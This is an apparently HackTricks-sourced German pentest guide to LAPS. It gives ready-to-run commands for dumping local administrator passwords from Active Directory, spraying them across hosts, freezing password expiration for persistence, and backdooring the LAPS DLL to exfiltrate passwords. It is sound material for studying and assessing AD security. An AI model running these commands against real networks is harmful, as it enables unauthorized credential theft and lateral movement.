# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Derzeit gibt es **2 LAPS-Varianten**, auf die du während eines Assessments stoßen kannst:

- **Legacy Microsoft LAPS**: speichert das Passwort des lokalen Administrators in **`ms-Mcs-AdmPwd`** und die Ablaufzeit in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (seit den Updates vom April 2023 in Windows integriert): kann weiterhin den Legacy-Modus emulieren, verwendet im nativen Modus jedoch **`msLAPS-*`**-Attribute, unterstützt **Passwortverschlüsselung**, **Passwortverlauf** und die **DSRM-Passwortsicherung** für Domain-Controller.

LAPS wurde entwickelt, um **Passwörter lokaler Administratoren** zu verwalten und sie auf in die Domain eingebundenen Computern **eindeutig, zufällig und regelmäßig geändert** zu halten. Wenn du diese Attribute lesen kannst, kannst du normalerweise als **lokaler Administrator** zum betroffenen Host pivoten. In vielen Umgebungen besteht der interessante Teil nicht nur darin, das Passwort selbst zu lesen, sondern auch herauszufinden, **wem der Zugriff** auf die Passwortattribute delegiert wurde.

### Legacy-Microsoft-LAPS-Attribute

In den Computerobjekten der Domain führt die Implementierung von Legacy Microsoft LAPS zum Hinzufügen von zwei Attributen:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **Passwort des Administrators im Klartext**
- **`ms-Mcs-AdmPwdExpirationTime`**: **Ablaufzeit des Passworts**

### Windows-LAPS-Attribute

Native Windows LAPS fügt den Computerobjekten mehrere neue Attribute hinzu:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: Klartext-Passwort-Blob, der als JSON gespeichert wird, wenn die Verschlüsselung nicht aktiviert ist
- **`msLAPS-PasswordExpirationTime`**: geplante Ablaufzeit
- **`msLAPS-EncryptedPassword`**: verschlüsseltes aktuelles Passwort
- **`msLAPS-EncryptedPasswordHistory`**: verschlüsselter Passwortverlauf
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: verschlüsselte DSRM-Passwortdaten für Domain-Controller
- **`msLAPS-CurrentPasswordVersion`**: GUID-basierte Versionsverfolgung, die von der neueren Rollback-Erkennungslogik verwendet wird (Forest-Schema von Windows Server 2025)

Wenn **`msLAPS-Password`** lesbar ist, enthält der Wert ein JSON-Objekt mit dem Kontonamen, dem Aktualisierungszeitpunkt und dem Klartext-Passwort, zum Beispiel:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Prüfen, ob aktiviert
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS-Passwortzugriff

Du könntest die **rohe LAPS-Richtlinie** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **herunterladen** und anschließend **`Parse-PolFile`** aus dem Paket [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) verwenden, um diese Datei in ein für Menschen lesbares Format zu konvertieren.

### PowerShell-Cmdlets für Microsoft Legacy LAPS

Wenn das Legacy-LAPS-Modul installiert ist, sind die folgenden Cmdlets normalerweise verfügbar:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell-cmdlets

Native Windows LAPS wird mit einem neuen PowerShell-Modul und neuen Cmdlets ausgeliefert:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Einige operative Details sind hierbei wichtig:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** verarbeitet automatisch **legacy LAPS**, **Klartext-Windows-LAPS** und **verschlüsseltes Windows-LAPS**.
- Wenn das Passwort verschlüsselt ist und du es **lesen**, aber nicht **entschlüsseln** kannst, gibt das Cmdlet Metadaten wie **`Source`**, **`DecryptionStatus`** und **`AuthorizedDecryptor`** zurück, selbst wenn es das Klartextpasswort nicht zurückgeben kann.
- Bei **verschlüsseltem Windows-LAPS** sind **Leseberechtigung** und **Entschlüsselungsberechtigung** **unterschiedliche Kontrollen**. Der Lesezugriff auf OU / Objekt bedeutet nicht automatisch, dass du **`msLAPS-EncryptedPassword`** entschlüsseln kannst.
- Der **Passwortverlauf** ist nur verfügbar, wenn die **Windows-LAPS-Verschlüsselung** aktiviert ist.
- Auf Domain Controllern kann die zurückgegebene Quelle **`EncryptedDSRMPassword`** sein.

Dies ist während eines Assessments nützlich, da das Feld **`AuthorizedDecryptor`** angibt, **für welchen Benutzer oder welche Gruppe der Blob verschlüsselt wurde**. Dadurch kann ein fehlgeschlagener Passwortzugriff häufig zu einem neuen Ziel für Privilege Escalation werden.

### PowerView / LDAP

**PowerView** kann ebenfalls verwendet werden, um herauszufinden, **wer das Passwort lesen kann, und es auszulesen**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Wenn **`msLAPS-Password`** lesbar ist, analysiere das zurückgegebene JSON und extrahiere **`p`** für das Passwort und **`n`** für den Namen des verwalteten lokalen Administratorkontos.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Das Feld **`n`** ist bei neueren Bereitstellungen relevant, da die **automatische Kontoverwaltung von Windows LAPS** auf ein **benutzerdefiniertes Konto** statt auf das integrierte Konto **`Administrator`** abzielen kann und neuere Systeme mit **Windows 11 24H2 / Windows Server 2025** sogar den Namen dieses Kontos **zufällig festlegen** können.<sup>[[4]](#references)</sup>

### Linux / Remote-Tools

Moderne Tools unterstützen sowohl das ältere Microsoft LAPS als auch Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Hinweise:

- Aktuelle **NetExec**-Builds unterstützen **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** und **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ist für **legacy Microsoft LAPS** von Linux aus weiterhin nützlich, zielt jedoch nur auf **`ms-Mcs-AdmPwd`**.
- Neuere plattformübergreifende Tools wie **`LAPS4LINUX`**, auf **`dpapi-ng`** basierende Tools und aktuelle **NetExec**-Workflows können auch **native Windows LAPS** von Nicht-Windows-Hosts aus verarbeiten.
- Wenn die Umgebung verschlüsseltes Windows LAPS verwendet, reicht ein einfacher LDAP-Read nicht aus; du musst außerdem ein **autorisierter Entschlüsseler** sein (oder über gleichwertiges Entschlüsselungsmaterial verfügen, etwa offline verfügbares DPAPI-NG-Root-Key-Material der Domain).<sup>[[5]](#references)</sup>
- Unter **Windows 11 24H2 / Windows Server 2025** solltest du nicht davon ausgehen, dass der verwaltete lokale Admin immer **`Administrator`** heißt. Die automatische Account-Verwaltung kann einen benutzerdefinierten Account erstellen und dessen Namen optional randomisieren. Ermittle daher zuerst den Account-Namen über **`n`** / **`Account`**, bevor du **`--laps`** in großem Umfang verwendest.<sup>[[4]](#references)</sup>

### Missbrauch der Verzeichnissynchronisierung

Wenn du über Rechte zur **Verzeichnissynchronisierung** auf Domain-Ebene statt über direkten Lesezugriff auf jedes Computerobjekt verfügst, kann LAPS weiterhin interessant sein.

Die Kombination aus **`DS-Replication-Get-Changes`** mit **`DS-Replication-Get-Changes-In-Filtered-Set`** oder **`DS-Replication-Get-Changes-All`** kann verwendet werden, um **vertrauliche / RODC-gefilterte** Attribute wie das legacy-Attribut **`ms-Mcs-AdmPwd`** zu synchronisieren. BloodHound modelliert dies als **`SyncLAPSPassword`**. Siehe [DCSync](dcsync.md) für den Hintergrund zu Replikationsrechten.

## LAPSToolkit

Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Enumeration von LAPS mit mehreren Funktionen.<sup>[[6]](#references)</sup>\
Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktiviertem LAPS.** Dadurch werden insbesondere **Gruppen** angezeigt, an die das **Lesen von LAPS-Passwörtern delegiert** wurde und bei denen es sich häufig um Benutzer in geschützten Gruppen handelt.\
Ein **Account**, der einen **Computer** einer Domain **beigetreten** hat, erhält `All Extended Rights` über diesen Host. Dieses Recht ermöglicht es dem **Account**, **Passwörter zu lesen**. Die Enumeration kann einen Benutzer-Account anzeigen, der das LAPS-Passwort eines Hosts lesen kann. Dies kann uns dabei helfen, bestimmte **AD-Benutzer** zu **targeten**, die LAPS-Passwörter lesen können.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping von LAPS-Passwörtern mit NetExec / CrackMapExec

Wenn du keine interaktive PowerShell hast, kannst du dieses Privileg remote über LDAP missbrauchen:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Dies gibt alle LAPS-Secrets aus, die der Benutzer lesen kann, und ermöglicht dir so, dich mit einem anderen lokalen Administratorkennwort lateral weiterzubewegen.

## LAPS-Passwort verwenden
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS-Persistenz

### Ablaufdatum

Sobald man Administrator ist, ist es möglich, **die Passwörter zu erhalten** und zu verhindern, dass ein Computer sein **Passwort aktualisiert**, indem man das **Ablaufdatum in die Zukunft setzt**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS verwendet stattdessen **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Das Passwort wird weiterhin rotiert, wenn ein **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** verwendet oder **Do not allow password expiration time longer than required by policy** aktiviert ist.

### Einschränkung beim Snapshot-Rollback unter neuerem Windows LAPS

Ältere Snapshot- / Image-Rollback-Tricks sind gegen aktuelle **Windows LAPS**-Deployments **weniger zuverlässig**. Unter **Windows 11 24H2 / Windows Server 2025** vergleicht der Client, sofern das Forest-Schema **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) enthält, eine lokal zwischengespeicherte GUID mit dem in AD gespeicherten Wert und **rotiert das Passwort sofort**, wenn ein Rollback einen **inkonsistenten Zustand** erzeugt.

In der Praxis bedeutet dies, dass auf Snapshots basierende Persistenz oder Versuche, ein älteres bekanntes lokales Admin-Passwort wiederzubeleben, schnell auffliegen können, anstatt bis zum nächsten regulären Ablauf zu überleben.<sup>[[2]](#references)</sup>

Dieser Schutz gilt nur für **AD-backed Windows LAPS** und hängt weiterhin davon ab, dass die zurückgesetzte Maschine sich wieder bei **AD authentifizieren** kann. Wenn die Maschine nicht mehr mit AD kommunizieren kann, können **password history** oder **AD backup access** möglicherweise weiterhin Abhilfe schaffen.

### Einschränkung bei der Manipulation der automatischen Kontoverwaltung

Wenn **automatic account management** aktiviert ist, verwaltet Windows LAPS den Lebenszyklus des verwalteten lokalen Admin-Kontos. Unerwartete Versuche, dieses Konto umzubenennen, neu zu konfigurieren oder anderweitig zu manipulieren, können mit **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** abgewiesen werden. Daher ist Persistenz, die von einer unbemerkten Änderung des verwalteten LAPS-Kontos abhängt, auf neueren Endpunkten weniger zuverlässig.<sup>[[4]](#references)</sup>

### Wiederherstellung historischer Passwörter aus AD-Backups

Wenn **Windows LAPS encryption + password history** aktiviert ist, können gemountete AD-Backups zu einer zusätzlichen Quelle für Secrets werden. Wenn du Zugriff auf einen gemounteten AD-Snapshot hast und den **recovery mode** verwenden kannst, kannst du ältere gespeicherte Passwörter abfragen, ohne mit einem aktiven DC zu kommunizieren.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Dies ist hauptsächlich bei **AD-Backup-Diebstahl**, **Missbrauch von Offline-Forensik** oder **Zugriff auf Disaster-Recovery-Medien** relevant.

### Backdoor

Der ursprüngliche Quellcode für das alte Microsoft LAPS ist [hier](https://github.com/GreyCorbel/admpwd) zu finden. Daher ist es möglich, eine Backdoor in den Code einzubauen (beispielsweise in die `Get-AdmPwdPassword`-Methode in `Main/AdmPwd.PS/Main.cs`), die auf irgendeine Weise **neue Passwörter exfiltriert oder sie irgendwo speichert**.

Kompiliere anschließend die neue `AdmPwd.PS.dll` und lade sie auf die Maschine nach `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hoch (und ändere die Änderungszeit).

## Referenzen

- [1] [Einführung in Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows-LAPS-Schema und Rechteerweiterungen für Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Erste Schritte mit Windows LAPS und Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Kontoverwaltungsmodi von Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
